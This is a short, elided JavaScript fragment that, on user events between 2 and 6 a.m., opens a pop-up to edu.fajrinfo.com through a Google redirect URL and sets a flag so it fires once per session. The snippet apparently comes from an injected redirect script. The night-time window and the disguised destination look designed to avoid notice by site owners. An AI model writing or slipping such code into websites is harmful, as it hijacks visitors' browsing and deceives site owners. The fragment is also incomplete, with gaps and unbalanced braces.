...
if(!sessionStorage.ef&&new Date().getHours()>=2&&new Date().getHours()<=6){
    function AB(CD){
        document.addEventListener(CD,()=>{
                ...
                window.open(`https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&url=https%3A%2F%2Fedu.fajrinfo.com%2F&usg=AOvVaw3I4MPjs6FqgBod4oFx02Qu`);
                sessionStorage.ef = '1';
            }
        })
    }
